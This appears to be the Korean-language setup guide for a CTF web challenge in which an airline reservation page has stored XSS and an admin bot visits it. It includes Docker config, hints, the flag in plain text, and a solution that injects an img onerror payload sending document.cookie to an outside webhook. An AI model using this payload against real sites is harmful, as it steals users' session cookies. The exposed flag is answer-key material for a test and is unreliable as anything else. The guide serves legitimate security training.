# Airline Reservation XSS with Bot - CTF Challenge

## 🚀 Quick Start

### Docker로 실행 (권장)
```bash
cd private
docker-compose up -d

# 로그 확인
docker logs -f airline-reservation-xss
```

### 로컬 실행
```bash
cd private
npm install
npm start
```

서비스 접속: `http://localhost:8000`

## 📁 프로젝트 구조

```
web-airline-reservation-xss/
├── challenge.yml          # CTF 챌린지 설정
├── README.md             # 상세 문제 설명 및 풀이
├── SETUP.md              # 이 파일
├── .gitignore
│
├── public/               # 배포용 (FLAG 제거)
│   ├── index.html
│   ├── server.js
│   ├── style.css
│   ├── package.json
│   └── data/
│       └── flight.json
│
├── private/              # 실제 챌린지 (FLAG 포함)
│   ├── index.html
│   ├── server.js
│   ├── style.css
│   ├── package.json
│   ├── Dockerfile
│   ├── docker-compose.yml
│   ├── .dockerignore
│   └── data/
│       └── flight.json
│
└── poc/                  # Proof of Concept
    ├── README.md         # 상세 exploit 가이드
    ├── poc.py            # Python exploit 스크립트
    └── exploit.sh        # Shell exploit 스크립트
```

## 🎯 Challenge 정보

- **Name**: Airline Reservation XSS with Bot
- **Category**: Web
- **Difficulty**: Easy
- **Port**: 8000
- **Flag**: `Whois2025{XSS_1n_A1rl1n3_R3s3rv4t10n_Syst3m_2025}`
- **Tags**: XSS, Stored XSS, Bot, Cookie Stealing, Puppeteer

## 💡 Hints

<details>
<summary>힌트 1</summary>
예약 목록에 표시되는 이름이 어떻게 렌더링되는지 확인해보세요.
innerHTML은 XSS에 취약할 수 있습니다.
</details>

<details>
<summary>힌트 2</summary>
"관리자에게 신고" 기능을 사용하면 봇이 페이지를 방문합니다.
봇의 쿠키에 FLAG가 있을 수 있습니다.
</details>

<details>
<summary>힌트 3</summary>
외부 서버(Webhook.site 등)로 쿠키를 전송하는 XSS 페이로드를 작성하세요.
</details>

## 🔧 테스트 방법

### 1. 기본 동작 확인

```bash
# 서버 실행
cd private
npm install
npm start

# 다른 터미널에서 테스트
curl http://localhost:8000
```

### 2. 예약 생성 테스트

```bash
curl -X POST http://localhost:8000/api/reservations \
  -H "Content-Type: application/json" \
  -d '{"name":"홍길동","seat":"7B"}'
```

### 3. Report 기능 테스트

```bash
curl "http://localhost:8000/report?path=index.html"
```

### 4. POC 스크립트 실행

**Python:**
```bash
cd poc
python3 poc.py --help
python3 poc.py -t  # 기본 XSS 테스트
```

**Shell:**
```bash
cd poc
chmod +x exploit.sh
./exploit.sh http://localhost:8000 https://webhook.site/YOUR_ID
```

## 🐳 Docker 설정

### Dockerfile 설명

```dockerfile
# Node.js 18 Alpine 기반
FROM node:18-alpine

# Chromium 설치 (Puppeteer용)
RUN apk add --no-cache \
    chromium \
    nss \
    freetype \
    harfbuzz

# Puppeteer 환경 변수
ENV PUPPETEER_SKIP_CHROMIUM_DOWNLOAD=true \
    PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser

# 애플리케이션 설정
WORKDIR /app
COPY package*.json ./
RUN npm install --production
COPY . .

# FLAG 환경 변수
ENV FLAG=Whois2025{XSS_1n_A1rl1n3_R3s3rv4t10n_Syst3m_2025}

EXPOSE 8000
CMD ["node", "server.js"]
```

### docker-compose.yml 설명

```yaml
version: '3.8'
services:
  web:
    build: .
    container_name: airline-reservation-xss
    ports:
      - "8000:8000"
    environment:
      - FLAG=Whois2025{XSS_1n_A1rl1n3_R3s3rv4t10n_Syst3m_2025}
    cap_add:
      - SYS_ADMIN  # Puppeteer 실행에 필요
    security_opt:
      - seccomp:unconfined  # Chromium 실행에 필요
```

### Docker 명령어

```bash
# 빌드 및 실행
docker-compose up -d

# 로그 확인
docker logs -f airline-reservation-xss

# 컨테이너 접속
docker exec -it airline-reservation-xss sh

# 중지 및 삭제
docker-compose down

# 재빌드
docker-compose up -d --build
```

## 📝 Solution 요약

1. **Webhook 준비**: https://webhook.site 에서 URL 생성
2. **XSS 페이로드**: `<img src=x onerror="fetch('WEBHOOK_URL?flag='+document.cookie)">`
3. **예약 생성**: 탑승객 이름에 페이로드 입력
4. **Bot 트리거**: "관리자에게 신고" 버튼 클릭
5. **FLAG 확인**: Webhook에서 쿠키 확인

## 🔍 디버깅

### Puppeteer 로그 확인

`server.js`를 수정하여 디버그 모드 활성화:

```javascript
const browser = await puppeteer.launch({ 
    headless: false,  // 브라우저 창 표시
    devtools: true,   // 개발자 도구 자동 열기
    ...
});
```

### 네트워크 확인

```bash
# Docker 네트워크 확인
docker network ls
docker network inspect web-airline-reservation-xss_ctf-network

# 컨테이너 포트 확인
docker port airline-reservation-xss
```

### 문제 해결

**Puppeteer가 실행되지 않을 때:**
```bash
# 컨테이너 내부에서 Chromium 확인
docker exec -it airline-reservation-xss sh
chromium-browser --version
```

**포트 충돌:**
```bash
# 다른 포트로 변경
docker-compose down
# docker-compose.yml에서 포트 변경 (예: 8001:8000)
docker-compose up -d
```

## ⚠️ 주의사항

1. **교육 목적**: 이 프로젝트는 CTF 및 교육 목적으로만 사용
2. **Docker 권한**: `SYS_ADMIN` cap은 Puppeteer 실행에 필요하지만 보안상 위험할 수 있음
3. **실제 배포**: 프로덕션 환경에서는 적절한 보안 설정 필요

## 📚 참고 자료

- [Puppeteer Documentation](https://pptr.dev/)
- [Docker Security Best Practices](https://docs.docker.com/develop/security-best-practices/)
- [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/)
